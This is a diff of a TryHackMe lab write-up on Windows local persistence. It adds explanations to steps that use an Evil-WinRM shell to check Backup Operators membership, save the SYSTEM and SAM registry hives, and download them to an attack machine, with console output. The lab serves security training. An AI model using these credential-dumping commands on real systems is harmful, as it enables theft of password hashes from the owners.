@@ -3,7 +3,7 @@ Module link: https://tryhackme.com/room/windowslocalpersistence
 
 # Assigning Group Memberships
 1. Start this room's machine
-2. `cd \` from the compromised Windows machine to ensure that we'll be executing the following commands starting from the root directory
+2. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
 ```PowerShell
 C:\Users\Administrator>cd \
 ```
@@ -39,7 +39,7 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> 
 ```
-8. `whoami /groups`
+8. `whoami /groups` to display what groups the currently logged in user is a part of onto our terminal, which showed the **Backup Operators** group to be enabled since we enabled the LocalAccountTokenFilterPolicy registry policy on the compromised Windows machine
 ```bash
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
 
@@ -59,23 +59,23 @@ NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory gro
 NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level Label            S-1-16-12288
 ```
-9. `cd \`
+9. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
 ```Bash
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> cd \
 ```
-10. `reg save hklm\system {FILENAME1}.bak`
+10. `reg save hklm\system {FILENAME1}.bak` to create and save a backup file of the compromised Windows machine's **System** registry key
 ```Bash
 *Evil-WinRM* PS C:\> reg save hklm\system SYSTEM.bak
 The operation completed successfully.
 
 ```
-11. `reg save hklm\sam {FILENAME2}.bak`
+11. `reg save hklm\sam {FILENAME2}.bak` to create and save a backup file of the compromised Windows machine's **SAM** registry key
 ```Bash
 *Evil-WinRM* PS C:\> reg save hklm\sam SAM.bak
 The operation completed successfully.
 
 ```
-12. `download {FILENAME1}.bak`
+12. `download {FILENAME1}.bak` to download the backup file of the compromised Windows machine's **System** registry key from their system onto our Linux attack machine
 ```Bash
 *Evil-WinRM* PS C:\> download SYSTEM.bak
 Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak
@@ -83,7 +83,7 @@ Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak
                                                              
 Info: Download successful!
 ```
-13. `download {FILENAME2}.bak` 
+13. `download {FILENAME2}.bak` to download the backup file of the compromised Windows machine's **SAM** registry key from their system onto our Linux attack machine
 ```Bash
 *Evil-WinRM* PS C:\> download SAM.bak
 Info: Downloading C:\\SAM.bak to SAM.bak
